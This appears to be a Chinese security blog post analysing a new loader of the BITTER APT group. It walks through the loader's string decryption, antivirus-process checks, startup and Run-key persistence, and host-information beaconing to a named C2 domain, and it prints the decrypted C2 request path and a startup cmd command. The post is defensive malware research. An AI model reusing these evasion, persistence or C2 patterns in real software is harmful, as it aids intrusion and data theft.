@@ -1,0 +1,342 @@
+# 蔓灵花（BITTER）一个新版本的Loader分析
+
+阅读量 **225051**
+
+|评论 **3**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2020-08-20 11:00:25
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t01cb2bb284e81585dd.jpg)
+
+## 0x00 前言
+
+在日常刷twitter时，发现黑鸟大佬发了一个Bitter的样本md5。由于笔者之前也大概的看过bitter的相关样本，想着这个可能是新版本的bitter，于是下载回来分析一下。
+
+![](https://p1.ssl.qhimg.com/t01dcea85c931516a96.png)
+
+首先在VT查询一下该样本的hash，根据VT的情报可知样本原名为WinUpdate，并且上传时间就是2020年8月17，时间挺新的，不知道样本是不是新样本。
+
+![](https://p0.ssl.qhimg.com/t01702f8a6865a39db6.png)
+
+目前，VT上没有杀软将其标记为bitter，分析看看。
+
+## 0x01 行为检测
+
+将样本下载到本地之后，重命名为WinUpdate.exe，然后通过火绒剑监控该样本的行为。  
+样本启动之后，过了一段时间才有后续的行为， 猜测是样本中有一个sleep用于过沙箱。
+
+将注册表信息过滤之后，可以看到程序首先是在启动项下创建了一个名为winup.lnk的快捷方式
+
+![](https://p5.ssl.qhimg.com/t010575364e30cd6391.png)
+
+然后程序copy自身到了%appdata%下的<sendto>目录下。
+
+![](https://p0.ssl.qhimg.com/t010d97d474ea766524.png)
+
+快捷方式的target值如下：  
+%USERPROFILE%\AppData\Roaming\Microsoft\Windows\SendTo\winupd.exe
+
+可以看到，这个快捷方式就是用于启动这个复制之后的winupd.exe
+
+powershell查看一下这个winupd.exe的md5：
+
+![](https://p5.ssl.qhimg.com/t01c78ec6a37607cf8a.png)
+
+文件hash与原文件保持一致，确定是直接复制过来的。
+
+## 0x02 代码分析
+
+### WinMain入口点
+
+其实代码一打开，就可以很明显的看出来，这就是Bitter家族的loader样本了，跟老样本几乎一样，但是既然打开了，就顺便分析分析，之前也只是大概看了下，没有完整的分析这个马的实现。
+
+![](https://p2.ssl.qhimg.com/t012300594371278b1b.png)
+
+IDA加载样本，可以看到程序由VC编译，有标准的winMain函数，在Main函数进来，程序首先是调用了两次LoadStringA函数从资源加载WindowName和ClassName。两个串的编号分别是67H和6dh，两个缓冲区长度都是64h。
+
+load的String分别是LiveDN 和 LIVEDN
+
+![](https://p1.ssl.qhimg.com/t01e2306ec2db1c6d37.png)
+
+LoadString的操作结束之后，程序调用了sub_4012D0，这里可以看到，这个函数并没有什么实际意义，可以直接跳过。
+
+![](https://p4.ssl.qhimg.com/t01b7497ae45584f0ea.png)
+
+然后根据刚才获取到的信息CreateWindow
+
+![](https://p1.ssl.qhimg.com/t01fce8e4493db8bc66.png)
+
+如果CreateWindowEx操作失败，程序则会跳转到loc_401104，退出执行。
+
+![](https://p3.ssl.qhimg.com/t0147146146725799fc.png)
+
+跟最开始猜测是一致，程序中有多个sleep
+函数，并且每次sleep的时间不同。这里首先是sleep45s，然后尝试通过WSAStartup初始化，如果初始化成功，则继续sleep15s。接下来调用了函数sub_402B00
+
+![](https://p2.ssl.qhimg.com/t01470a02003f13ddf3.png)
+
+### sub_402B00-字符串解密
+
+进来之后，很明显是循环解密字符串的函数：
+
+![](https://p5.ssl.qhimg.com/t0135c3d6dd081fad7b.png)
+
+我们直接调试器过来走一波
+
+为了方便调试，需要首先找到sleep函数的调用地方，手动将sleep函数给patch了。这里直接过去吧每个sleep函数的参数修改为0然后x64dbg打补丁即可。
+
+![](https://p5.ssl.qhimg.com/t01ca26aa88dfa221b3.png)
+
+修改之后打上补丁，然后修补文件，重新加载即可。
+
+![](https://p1.ssl.qhimg.com/t01d03845fa6c93b4c9.png)
+
+过来之后调试器看一下就知道，原始的字符串存放在这里edx指向的位置，并且每个字符串都是按照100的偏移存储的
+
+![](https://p4.ssl.qhimg.com/t016edead10e202b48e.png)
+
+注意看地址，解密之后，将字符串存储在原来的位置：
+
+![](https://p0.ssl.qhimg.com/t013ca5a064c69546ab.png)
+
+分别跑下来，解密出的所有的字符串如下：  
+Winupd  
+.exe  
+avp  
+SOFTWARE\Microsoft\Windows\CurrentVersion\Ru  
+temp  
+cmd /c start  
+%tempf% && exit  
+Environment  
+GET /RsdvgiMincSnyYu/  
+HTTP/1.1\r\nHost  
+box.livevideosonlinepk[.]com  
+\nConnection: close\r\n\r\n  
+erHyPfilbmiw1.php?  
+bvrussw45io90.php?  
+aerb5vfjytv20.php?
+
+通过分析这些字符串，其实已经可以把这个马的基本功能猜的八九不离十了。  
+首先，Winupd.exe是程序名，结合后面的SOFTWARE\Microsoft\Windows\CurrentVersion\Ru
+猜测后面成功应该是会将这个文件的路径作为注册表键值写入到开机自启动项中。
+
+C2的域名应该是box.livevideosonlinepk[.]com，样子是一个php服务器，接受get参数，并且有多个应答页面。
+
+但这些目前还只是猜测，接下来去找找具体的代码实现，证明上面的猜想。
+
+字符串解密之后，程序首先手通过GetModuleFileName获取当前的完整路径名，然后创建一个信号量，调用GetLastError判断返回值是否是0B7，也就是183.
+
+![](https://p5.ssl.qhimg.com/t01cee0167a56669b4f.png)
+
+这里返回的0b7也就是183，表示信号量已经存在，这里应该也是用这种方式来防止多开。
+
+如果返回值不为183，程序则跳转到loc_40111d继续执行，否则说明程序已经运行，则结束本次运行。
+
+过来loc_40111d字后，程序首先是调用了sub_402ee0，然后操作了一些之前解密的字符串。
+
+![](https://p1.ssl.qhimg.com/t01c1f2a136ac904976.png)
+
+sub_402EE0-杀软检测
+
+sub_402ee0进来之后，程序多洗调用了su_401590函数，通过查看，可以知道这里是在遍历进程信息。
+
+![](https://p3.ssl.qhimg.com/t019419bb5c0ece02cc.png)
+
+遍历当前的进程，寻找包含了avp的进程。
+
+![](https://p3.ssl.qhimg.com/t0164bbda8085bfb61d.png)
+
+如果最后成功找到目标进程，则会跳转到后面去返回1，否则通过xor al,al的操作返回0
+
+![](https://p3.ssl.qhimg.com/t01bf600cccb8bf8b9f.png)
+
+返回回来之后，程序马上会判断al的值，如果al为1，说明找到了指定进程，则程序会退出当前函数，否则jnz到下面继续执行
+
+![](https://p1.ssl.qhimg.com/t0168c9a0c3abbf6fe7.png)
+
+接下来，程序又会调用一次Rename_ergodic_Proc函数，这次是尝试去查找Avast相关的进程。
+
+![](https://p3.ssl.qhimg.com/t01c1fb9b82fece182f.png)
+
+原来这个函数是用于排查杀软的，这个时候我才后知后觉的去查avp.exe到底是个啥，原来是卡巴的杀软名称。怪自己之前对各家的杀软主名称不太熟，以后遇到就知道了！  
+
+回到IDA交叉引用一下，推测程序可能是过滤了9款杀软。
+
+![](https://p1.ssl.qhimg.com/t0126619af4eedc6be9.png)
+
+测试一下，出了卡巴的avp.exe和Avast.exe，程序还会尝试去查找以下几款杀软：  
+AVG  
+sophos  
+SAVAD
+
+这几个杀软检测完之后，程序就退出了402EE0函数，返回出来继续调用Rename_ergodic_Proc函数进行进程遍历，但是这里的参数是aVgkqk这个参数，这个参数有印象，因为在上面是调用解密函数解密的，解密出来应该是winupd，所以程序在这里应该是判断是否存在包含winupd的进程了，这个函数只是单纯的进程遍历和查找函数，sub_402EE0是杀软检测函数。
+
+![](https://p4.ssl.qhimg.com/t0187bbf085b464485b.png)
+
+果然，第一个遍历查找winupd
+
+![](https://p5.ssl.qhimg.com/t01ca376cbba80ed978.png)
+
+然后第二个遍历又是查找avp，卡巴的杀软：
+
+![](https://p3.ssl.qhimg.com/t019a9af85af02506f2.png)
+
+然后根据条件跳转到不同的地方继续执行。这里是会跳转到loc_40118D。等下再回去看看如果检查到卡巴杀软，程序会做什么，先跟着流程往下走。
+
+来到loc_40118D之后，程序会获取指定的路径，然后在后面实现文件拷贝的操作。
+
+![](https://p3.ssl.qhimg.com/t012fd747ceeeb5f202.png)
+
+### 信息获取
+
+在实现CopyFile之前，程序还调用了两个函数，分别是sub_401B20和sub_4019D  
+首先是sub_401B20，这个函数用于获取计算机的一些基本信息
+
+![](https://p0.ssl.qhimg.com/t01bac44f09878553b5.png)
+
+然后将获取到的这些信息全部拼接起来：
+
+![](https://p0.ssl.qhimg.com/t011f8a1dfb8cc7a55b.png)
+
+正在拼接
+
+![](https://p1.ssl.qhimg.com/t011566d8460d2aa0f3.png)
+
+### 网络请求
+
+然后下面这个004019D0函数应该就是用于网络请求相关的函数了
+
+![](https://p0.ssl.qhimg.com/t0168c618c4ad8b2aad.png)
+
+尝试通过getaddrinfo获取C2的地址
+
+![](https://p5.ssl.qhimg.com/t01b372ff36a1063494.png)
+
+考虑到可能会获取失败，程序这里会通过一个循环+sleep，一直调用19d0这个函数去解析C2地址。
+
+![](https://p3.ssl.qhimg.com/t010f8cd2d901e5e839.png)
+
+手动修改之后跳转下来，程序会尝试将之前获取到本地信息发送到C2的指定地址去了。
+
+![](https://p2.ssl.qhimg.com/t019391a754fd7449db.png)
+
+请求完整参数为：ecx:”GET
+/RsdvgiMincSnyYu/PerHyPfilbmiw1.php?info=ssss[@WIN](https://github.com/WIN
+"@WIN")-IHN30SD7IMB[@xxx](https://github.com/xxx
+"@xxx")[@Windows7HomeBasic](https://github.com/Windows7HomeBasic
+"@Windows7HomeBasic")-w1-@-@”
+
+![](https://p5.ssl.qhimg.com/t01d886aa13ac3ef77f.png)
+
+在这里的00401CC0函数中就是进行网络请求了
+
+![](https://p3.ssl.qhimg.com/t0115869088988c0ac3.png)
+
+搞清楚了这个函数的功能，将其重命名为ReName_SendData，ReName_SendData函数调用之后，在下面会执行一个永真循环，循环中调用的函数我们之前的分析过了，就是获取C2指定地址，然后请求C2
+
+![](https://p4.ssl.qhimg.com/t01b309f8d9aebc09ba.png)
+
+### 下载后续样本
+
+经过分析，发现sub_401FC0函数是关键函数
+
+![](https://p3.ssl.qhimg.com/t011a8e9da5393fc642.png)
+
+接受服务器返回并写入文件：
+
+![](https://p4.ssl.qhimg.com/t014f08d6ecca24b216.png)
+
+最后通过ShellExecuteA执行下载回来的文件。
+
+![](https://p3.ssl.qhimg.com/t019ffea26a1640c853.png)
+
+### 卡巴杀软检测部分
+
+之前我们提到，样本在检测到卡巴的杀软之后有几个操作，但是当时我们绕过去了，现在回去看看。
+
+回到逻辑检测部分的代码：
+
+![](https://p4.ssl.qhimg.com/t01b8bbb583599d8f9f.png)
+
+这里是先判断了查找当前进程名的返回值，应该是用于判断样本的名字是否是指定的winupd，如果是，则说明程序之前已经被启动过了，这里相当于一个校验。接着程序判断是否找到了卡巴的杀软进程，然后执行不同的操作。
+
+首先来看一下第一个操作，根据之前的行为分析，可以知道样本有一个关键行为就是复制自身到sento目录，然后创建一个指向该文件的快捷方式到启动项中。
+
+如果程序的名字不包含winupd：
+
+![](https://p0.ssl.qhimg.com/t019cc49010a5b69f17.png)
+
+文件拷贝过去：
+
+![](https://p4.ssl.qhimg.com/t017913dbcd4a4e1d3a.png)
+
+最后再来看一下，如果检查到卡巴杀软会怎么做。
+
+如果检测到卡巴杀软，程序则解密一个cmd命令  
+cmd /c start %tempf% && exit
+
+![](https://p1.ssl.qhimg.com/t01cb68fef43e0aace2.png)
+
+然后将这里的n和之前解密出来的SOFTWARE\Microsoft\Windows\CurrentVersion\Ru拼接起来，设置开机自启动项目。
+
+![](https://p1.ssl.qhimg.com/t01e11e1bbe8ff8f1c6.png)
+
+设置的键值就是cmd /c start %tempf% && exit
+
+![](https://p0.ssl.qhimg.com/t010d55b8ee00842232.png)
+
+这里这个命令猜测是用于退出自身的，好奇为什么检测了两次卡巴然后退出。  
+笔者找到了之前的一个bitter的loader样本，经过分析之后发现老版本的loader 注册表这里是将自身写入成开机自启动。
+
+![](https://p2.ssl.qhimg.com/t01363e667ba5d7fc6d.png)
+
+## 0x03 总结
+
+经过分析，这个样本结构，代码，操作，基本和之前的样本一样。但还是能看的出来有一些代码的改进。
+
+  1. a. 样本运行后，首先会解密一系列后面会用到的字符串
+  2. b. 样本会在2EE0函数中检测杀软，目前看到的是检测avp.exe、Avast.exe，AVG、sophos、SAVAD
+  3. c. 样本会判断当前的进程中是否包含了winupd，同时再次检测avp.exe，如果程序名包含了winupd则说明程序不是第一次运行，如果没有包含则说明可能是第一次运行，程序则会尝试将自身赋值到sento目录并在启动目录下创建一个快捷方式指向该文件。如果程序检测到了avp进程，即卡巴杀软，样本会创建一个开机启动的注册表执行cmd /c start %tempf% && exit
+  4. d. 环境检测、软件检测完成之后，样本会开始网络请求，请求的内容是本地主机的一些基本信息，包括机器名，操作系统版本号，是否为管理员，木马版本号等。
+  5. e. 尝试从C2服务器读取数据，写入本地文件并加载执行。
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **jux1a** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/214641](/post/id/214641)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [恶意样本](/tag/恶意样本)
+  * [bitter](/tag/bitter)
+
+ **+1** __4赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t01c900f6a705a10464.png) jux1a
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
